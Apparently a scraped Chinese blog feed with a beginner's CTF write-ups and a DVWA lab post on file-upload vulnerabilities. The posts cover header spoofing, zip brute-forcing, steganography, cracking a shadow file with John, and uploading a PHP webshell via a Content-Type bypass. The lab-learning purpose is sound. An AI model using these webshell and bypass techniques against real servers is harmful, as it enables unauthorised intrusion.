src="https://img-blog.csdnimg.cn/20200325073307983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>xff（X-Forwarded-For）</p><blockquote><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案[1]中正式提出。<br>当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。<br>如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。<br>******可以通过修改xff来伪装一个IP<br>  ———————来自维基百科</p></blockquote><p>Referer</p><blockquote><p>检查Referer字段<br><strong>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址</strong>。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于<a href="http://www.examplebank.com之下.而如果是csrf攻击传来的请求,referer字段会是包含恶意网址的地址,不会位于www.examplebank.com之下,这时候服务器就能识别出恶意的访问./">www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。</a><br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，<strong>篡改其Referer字段</strong>的可能。<br>————来自维基百科</p></blockquote><p>没见过这种题，一点头绪都没有，看看别人的思路是什么样的，然后发现两种方法解这个题。<br>1.burp修改http和cookie<br>先抓包（我的这个burp有点任性，总是看心情抓的。我也很无奈。）<br><img src="https://img-blog.csdnimg.cn/20200325075400215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加一行xff</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200325075612270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>放包（Forward）然后会看到浏览器页面已经有变化了。<br><img src="https://img-blog.csdnimg.cn/20200325080017355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>出现了提示，再次刷新网页重新抓包<br>添加xff和Referer两条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200325080459990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再次放包，就拿到了flag<br><img src="https://img-blog.csdnimg.cn/20200325080603542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二种方法<br>使用谷歌浏览器的ModHeader插件修改，添加X-Forwarded-For的name和value。<br><img src="https://img-blog.csdnimg.cn/20200325081042966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后看到我的页面刷新后有变化了。<br><img src="https://img-blog.csdnimg.cn/2020032508130955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加Referer<br><img src="https://img-blog.csdnimg.cn/20200325081514815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>修改后，再次刷新页面就得到了flag<br><img src="https://img-blog.csdnimg.cn/20200325081720901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>感觉插件比burp方便很多😎😎😎参考的这位大佬的博客里面有使用<a href="https://blog.csdn.net/God_XiangYu/article/details/100644086">插件的详细步骤</a></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><h3 id="5">Misc</h3></h3><h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a><h5 id="6">基础破解</h5></h1><p><img src="https://img-blog.csdnimg.cn/20200325131628344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个下载压缩包后，直接解压，里面还有压缩包，而且还加密了，加密的压缩包目前我知道并且能想到的有两种可能，就是暴力破解和伪加密，我是先试暴力破解的，运气不错，直接破解出来了。<br><img src="https://img-blog.csdnimg.cn/20200325131350970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以打开加密文件，<br><img src="https://img-blog.csdnimg.cn/20200325132205106.png" alt="Augenstern" loading="lazy"><br>base64解密就OK了，果然基础。这道题我感觉我再水题了。😂😂😂</p><h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a><h5 id="7">镜子里面的世界</h5></h1><p>做了半天可算找到一个不会让人觉得我在水题的题了<br><img src="https://img-blog.csdnimg.cn/20200325154858501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到图片，话不多说，先看看里面有没有隐藏文件再说，发送到foremost，然后没找到，<br>这个时候，再看图片，<img src="https://img-blog.csdnimg.cn/202003251556235.png" alt="Augenstern" loading="lazy"><br>刚开始没注意到图片名，就先去winhex里找了一波，找不到。又回去看了图片，才注意到文件名有点熟悉，，stegsolve。然后就放里面找，发现有几张图有点特别<br><img src="https://img-blog.csdnimg.cn/20200325155913359.png" alt="Augenstern" loading="lazy"><br>第一眼看着像摩斯密码，我就把它保存成MP3 文件了，但是打不开。奇怪，之前我记得这样的一道题是摩斯密码来着，然后就看看preview。发现了key<br><img src="https://img-blog.csdnimg.cn/20200325160627166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="教练，我-我想打CTF"><a href="#教练，我-我想打CTF" class="headerlink" title="教练，我..我想打CTF"></a><h5 id="8">教练，我..我想打CTF</h5></h1><p>他来了，他来了……<br><img src="https://img-blog.csdnimg.cn/20200325172221601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>老样子，foremost分离看看……然后什么也没找到。下一步进winhex，不幸的是还是什么都没有……<br>stegsolve，这次终于有东西了，不然我目前就没有其他办法了。<br><img src="https://img-blog.csdnimg.cn/20200325172651336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了文件头是<code>504b0304</code>这是一个zip文件的文件头，可以知道这是个zip压缩包。就把它命名成<code>1.zip</code>吧。<br>打开之后，什么文件？？？<br><img src="https://img-blog.csdnimg.cn/20200325172941401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>改，txt，什么的我全试了一遍每一个管用的。前面还挺顺利，又卡壳了，，，，不好的预感，这是要踩坑的节奏啊。然后就找大佬的wp找到了几个，kali？？，又跟kali扯上关系了。要下载，，，（不踩坑，不踩坑。）zsteg又是一个工具，没见过，有收获了。kali下载，<br>下载命令：<code>gem install zsteg</code><br>反正我用这个命令下载贼慢，而且还没下载上。可能是我天生被坑眷顾。我就找源码下载。刚开始看了一个博主的教程，结果跟我说地址拒绝连接。。。。。。该来的还是来了。<br>我自己找到的原链接：命令嘛<br>就是：<code>git clone https://github.com/zed-0xff/zsteg.git</code><br>成功安装<br><img src="https://img-blog.csdnimg.cn/20200325174212424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>安装gem：</p><p>命令：<code>apt-get install gem</code><br><img src="https://img-blog.csdnimg.cn/20200325174615872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后安装zsteg<br>命令：<code>gem install zsteg</code><br><img src="https://img-blog.csdnimg.cn/20200325180930361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>怎么说，安装过程可能要等上那么一段时间，嘿嘿，时间也不长，估计十几二十分钟吧，反正我的kali都自动挂起了，不要点其他的东西（回车也别点，不信看我上面的图，第四行和第五行，因为手*敲了回车。重来了），否则可能重来。啧啧啧。过程很痛苦。<br>废话不多说继续进行下一步<br>把在物理机上的压缩包复制到kali桌面上。然后右键单击压缩包，在此解压。像这样<br><img src="https://img-blog.csdnimg.cn/202003251922025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后，进入桌面的文件夹，<br>执行命令：<code>chmod 777 1</code>提到权限<br>再执行<code>./1</code>打开文件，出现flag如下图<br><img src="https://img-blog.csdnimg.cn/20200325191938635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不对啊，好像没怎么用到zsteg这个东西。算了，总归安装了也不亏啥，还了解有这么一个工具。<br>听说这道题还是一道非常经典的题。做出来心情爽。</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><h3 id="9">Crypto</h3></h3><h3 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a><h5 id="10">凯撒？替换？呵呵!</h5></h3><p><img src="https://img-blog.csdnimg.cn/20200325135458820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到这个题目，我感受到了迷之嘲讽，眯眼🥱🥱，搞个锤子奥，这个是啥玩意儿？？凯撒变种也没这么变的吧，，，我先用凯撒解密把F搞出来，然后栅栏解密开始一顿解，，，，白玩了。啥也没解出来。一看wp，这变种的真不一样，要暴力破解<a href="https://quipqiup.com/">https://quipqiup.com/</a>，爆破原理我也没搞懂，😣😣😣真菜，菜的抠脚。<img src="https://img-blog.csdnimg.cn/20200325140605325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a><h5 id="11">告诉你个秘密</h5></h3><p>这道题真的考验我这种练习时长两个月的新人的脑洞。我就不行了，真是菜的抠脚。<br><img src="https://img-blog.csdnimg.cn/20200325211101463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>文件就是两串数字<br><img src="https://img-blog.csdnimg.cn/20200325211210310.png" alt="Augenstern" loading="lazy"><br>先十六进制转字符<br><img src="https://img-blog.csdnimg.cn/20200325211349243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再进行base64解密<br><img src="https://img-blog.csdnimg.cn/20200325211449569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这解出来的数字在键盘上看。比如第一个<br><img src="https://img-blog.csdnimg.cn/20200325212312906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>四个字母中间包了一个字母，那就是flag的第一个字母，以此类推。拿到flag。提交不用加flag，也不用加cyberpeace，解出来什么就是什么。<br>反正我是想不起来，也没给点提示啊。无奈脑洞太小，菜的抠脚。</p><h3 id="Crack-it"><a href="#Crack-it" class="headerlink" title="Crack it"></a><h5 id="12">Crack it</h5></h3><p>看着来源就感觉好牛逼的样子<br><img src="https://img-blog.csdnimg.cn/2020032608380117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开文件又是一个没有扩展名的文件，这看看记事本打开是什么样子的。<br><img src="https://img-blog.csdnimg.cn/20200326084051376.png" alt="Augenstern" loading="lazy"><br>好吧看不出来是什么加密。没见过，看下wp，呃呃呃呃呃，还真是，上面那个想打CTF的那个题就是没有扩展名，要在kali里解。这个也一样那就打开kali解。<br>先进入shadow所在的文件夹位置。呃呃呃呃呃忽略我,下面的操作（看有效部分就OK），啥都不会，<br><img src="https://img-blog.csdnimg.cn/20200326082135187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后John，听说这个人很牛8，<br>直接用John命令的话，可能会无法使用所以先打开john这个程序。<br>打开方式：<br><img src="https://img-blog.csdnimg.cn/20200326090152330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后直接在搜索框里搜john就行了。<br>（我原本以为还要下载）<br>然后就进入到终端了，需要注意的一点就是：<br>1.你是以root账户打开kali的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show shadow</span><br></pre></td></tr></table></figure><p>2.以普通管理员账户打开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo john --show shadow</span><br></pre></td></tr></table></figure><p>就这样，出现了下面的结果<br><img src="https://img-blog.csdnimg.cn/20200326083537855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag是hellokitty</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞的了解和初次尝试</title>
      <link href="/2020/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BA%86%E8%A7%A3%E5%92%8C%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/"/>
      <url>/2020/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BA%86%E8%A7%A3%E5%92%8C%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传概念"><a href="#文件上传概念" class="headerlink" title="文件上传概念"></a>文件上传概念</h1><p>在各种网站，应该说基本的网站就会有上传文件的功能，比如说让上传个<code>.jpg、.png、.mp4</code>等文件，就拿一个普普通通的网站来说，注册账户后常见的换头像，换背景，可以把背景设置成一个短视频了等等。而文件上传漏洞就是这个上传文件的功能没有做好防护而产生的漏洞。<br>用户把文件上传到服务器的时候，服务器会检测用户上传的文件是否符合规则，不符合规则的文件（比如一句话木马等php文件）服务器会拒绝接受，用户就无法上传成功。<br>但是一旦上传成功，可以通过一句话木马构造的密码，用菜刀之类的工具来连接服务器。<br>刚学习文件上传漏洞，就拿靶机试一下。</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="low级别测试"><a href="#low级别测试" class="headerlink" title="low级别测试"></a>low级别测试</h2><p>先看源码。（DVWA里提供PHP源码查看。）<br><img src="https://img-blog.csdnimg.cn/20200407162415175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看看靶机提供的PHP源码。好像是没有什么限制条件。待会对比一下中级的。</p><h3 id="测试用到的工具、环境"><a href="#测试用到的工具、环境" class="headerlink" title="测试用到的工具、环境"></a>测试用到的工具、环境</h3><p>环境：DVWA（Damn Vulnerable Web Application!）<br>工具：中国蚁剑、一句话木马文件</p><h3 id="测试操作"><a href="#测试操作" class="headerlink" title="测试操作"></a>测试操作</h3><p>首先在本地写个一句话木马，并保存一个位置<br><img src="https://img-blog.csdnimg.cn/20200330225317901.png" alt="Augenstern" loading="lazy"><br>来到靶场，上传文件<br><img src="https://img-blog.csdnimg.cn/20200330225544983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里就看到了上传成功了<br><img src="https://img-blog.csdnimg.cn/20200330225652198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>复制文件路径（当然这只是靶机，其他网站是不会有路径放出来的。）<br><img src="https://img-blog.csdnimg.cn/20200330230145309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>复制1那个到url框里，记得把“#”删了再粘贴。<br><img src="https://img-blog.csdnimg.cn/20200330230511486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其实是空白，什么都没有，php代码是后端语言，在前端看不到的。所以这样很正常的。<br>然后打开中国蚁剑<br>添加数据<br><img src="https://img-blog.csdnimg.cn/20200330230837949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接密码就是一句话木马里的那个。<br><img src="https://img-blog.csdnimg.cn/20200330230932387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到连接成功了<br>然后就可以看到里面的信息甚至可以增、添、删、改服务器的数据<br><img src="https://img-blog.csdnimg.cn/20200402074150910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到，然后我把它删了，就出来一片红色警告。总之就是连不上了。</p><h2 id="medium级别测试"><a href="#medium级别测试" class="headerlink" title="medium级别测试"></a>medium级别测试</h2><p>靶机里调一下级别，调成中级。然后，我又去尝试了上传低级别的一句话木马，想看看对比。<br><img src="https://img-blog.csdnimg.cn/20200407162119614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>果然不行，看看PHP代码。<br><img src="https://img-blog.csdnimg.cn/20200407162613235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以对比出来中级的多了限制条件，只能传JPEG或者png图片并且还有大小限制。只能上传这个应该是100k的图片吧。<br>当然还有办法进行上传。这里需要绕过。但不是过狗啊，这里可没有狗，只是一个限制。所以想办法绕过。先了解一下mime文件类型和image文件类型<br><img src="https://img-blog.csdnimg.cn/20200407165728581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><a href="https://www.w3school.com.cn/media/media_mimeref.asp">了解mime</a><br>这个实验，上传mime实验。<br>操作示图：<br><img src="https://img-blog.csdnimg.cn/2020040910210511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="测试需要用到的工具"><a href="#测试需要用到的工具" class="headerlink" title="测试需要用到的工具"></a>测试需要用到的工具</h3><p>新朋友：burp suite<br>一句话木马，靶机环境：DVWA。连接工具：中国蚁剑。</p><h3 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h3><p>burp设置代理，开启burp，但是浏览器先不开代理。<br>开始选择准备上传的文件，先拿个txt文件试试水。<br><img src="https://img-blog.csdnimg.cn/20200407223717588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>开代理，传文件。抓包<br><img src="https://img-blog.csdnimg.cn/20200407223856237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>将type类型改为<code>image/jpeg</code>。然后放包。</p><p><img src="https://img-blog.csdnimg.cn/20200407224049482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>回到浏览器，看到了，上传成功了。<br><img src="https://img-blog.csdnimg.cn/20200407224227326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>查看一下上传的文件是什么样子的<br><img src="https://img-blog.csdnimg.cn/2020040722434643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到成功了，接下来就是传木马了。同样的操作。<br><img src="https://img-blog.csdnimg.cn/20200407224551759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>开蚁剑，连接<br><img src="https://img-blog.csdnimg.cn/20200407224821202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接成功了<br><img src="https://img-blog.csdnimg.cn/20200407224857284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到上次传入的<code>lxj.txt</code>，删了，收工。<br><img src="https://img-blog.csdnimg.cn/20200407225030490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="high级别测试"><a href="#high级别测试" class="headerlink" title="high级别测试"></a>high级别测试</h2><p>还是先看看代码再说（虽然不能完全看懂，但好歹能看懂几句。哈哈）<br><img src="https://img-blog.csdnimg.cn/2020040911083476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="实验操作-1"><a href="#实验操作-1" class="headerlink" title="实验操作"></a>实验操作</h3><p>代码限制了上传文件的类型和格式，其实试着传一个文件可以发现，它限制了文件的扩展名，所以只能上传图片。</p><h4 id="第一次错误尝试"><a href="#第一次错误尝试" class="headerlink" title="第一次错误尝试"></a>第一次错误尝试</h4><p>把写的一句话木马，写好，改成jpg格式。<br><img src="https://img-blog.csdnimg.cn/20200409134047754.png" 